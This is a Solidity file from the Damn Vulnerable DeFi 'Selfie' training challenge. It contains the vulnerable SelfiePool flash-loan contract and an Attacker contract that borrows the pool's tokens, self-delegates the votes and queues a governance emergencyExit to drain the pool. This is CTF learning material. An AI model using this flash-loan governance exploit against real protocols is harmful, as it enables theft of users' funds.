// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    IERC20 public immutable token;
    SimpleGovernance public immutable governance;

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event EmergencyExit(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token) {
            return token.balanceOf(address(this));
        }
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token) {
            revert UnsupportedCurrency();
        }
        return 0;
    }

    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}


contract Attacker is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance gov;
    DamnValuableVotes token;


    constructor(SelfiePool _pool, SimpleGovernance _gov, DamnValuableVotes _token) {
        pool = _pool;
        gov = _gov;
        token = _token;
    }

    function loan() external {
        pool.flashLoan(this, address(pool.token()), pool.maxFlashLoan(address(pool.token())), "");
    }

    function attackAndRecovery(address recovery) external {
        gov.executeAction(1);
        pool.token().transfer(recovery, pool.token().balanceOf(address(this)));
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external override returns (bytes32){
        bytes memory data = abi.encodeCall(pool.emergencyExit, address(this));
        token.delegate((address(this)));
        gov.queueAction(address(pool), 0, data);
        pool.token().approve(address(pool), pool.token().balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}